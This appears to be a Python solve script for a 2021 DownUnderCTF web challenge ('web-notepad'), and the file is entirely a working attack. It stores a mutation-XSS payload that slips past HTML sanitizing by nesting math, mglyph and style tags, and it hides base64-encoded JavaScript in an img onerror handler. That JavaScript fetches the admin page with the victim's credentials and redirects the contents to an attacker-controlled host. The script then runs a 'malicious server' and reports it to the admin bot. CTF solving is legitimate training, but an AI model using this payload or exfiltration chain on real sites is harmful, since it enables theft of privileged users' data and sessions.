import base64 as b64
import requests
import http.server
import threading
import time
import urllib.parse

BASE_URL = 'https://web-notepad-f6ed1a7d.chal-2021.duc.tf'
CHAL_EXT_URL = BASE_URL
sess = requests.Session()

SOLVE_USERNAME = 'ductf-solve-bot'
SOLVE_PASSWORD = '988eecfc7f3e3ab00b1eb077'
SOLVE_SCRIPT_BIND = '0.0.0.0'
SOLVE_SCRIPT_PORT = 7000  # Port to bind to if you are sitting behind a proxy
SOLVE_SCRIPT_HOST = 'REDACTED'
EXFIL_HTTP = f"https://{SOLVE_SCRIPT_HOST}/"

assert SOLVE_SCRIPT_HOST != 'REDACTED', "Solve script needs a domain name"

print('1. Logging in...')
sess.post(f'{BASE_URL}/register', data={
    'username': SOLVE_USERNAME,
    'password': SOLVE_PASSWORD
})
sess.post(f'{BASE_URL}/login', data={
    'username': SOLVE_USERNAME,
    'password': SOLVE_PASSWORD
}).raise_for_status()


print('2. Storing a payload')
EXFIL_SCRIPT = b64.b64encode("""
fetch('/admin',{credentials:'include'}).then(t=>t.text()).then(t=>location='{{exfil}}'+btoa(t))
""".strip().replace('{{exfil}}', EXFIL_HTTP).encode()).decode()

MXSS_EXFIL = 'a</p>' \
    '<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph>' \
    f'<img&Tab;src=1&Tab;onerror=eval(atob(\'{EXFIL_SCRIPT}\'));&gt;">' \
    '<style>'

sess.post(f'{BASE_URL}/me', data={
    'note': MXSS_EXFIL
})

print('3. Spin up a malicious server')
def server():
    stop = False
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()

            if self.path == '/':
                self.wfile.write(
                    open('index.html').read()
                        .replace('{{username}}', SOLVE_USERNAME)
                        .replace('{{password}}', SOLVE_PASSWORD)
                        .replace('{{baseurl}}',  CHAL_EXT_URL)
                        .encode()
                )
            else:
                stop = True
                print(self.path)
    httpd = http.server.HTTPServer((SOLVE_SCRIPT_BIND, SOLVE_SCRIPT_PORT), Handler)
    print(f'[+] Started HTTP Server for {SOLVE_SCRIPT_HOST}:{SOLVE_SCRIPT_PORT} serving malicious payload')
    while not stop:
        httpd.handle_request()

server_thread = threading.Thread(target=server)
server_thread.start()

time.sleep(3)

print('4. Tell the admin to get the site')
sess.post(f'{BASE_URL}/report', data={
    'url': f'http://{SOLVE_SCRIPT_HOST}:{SOLVE_SCRIPT_PORT}/'
})

time.sleep(3)
server_thread.join()
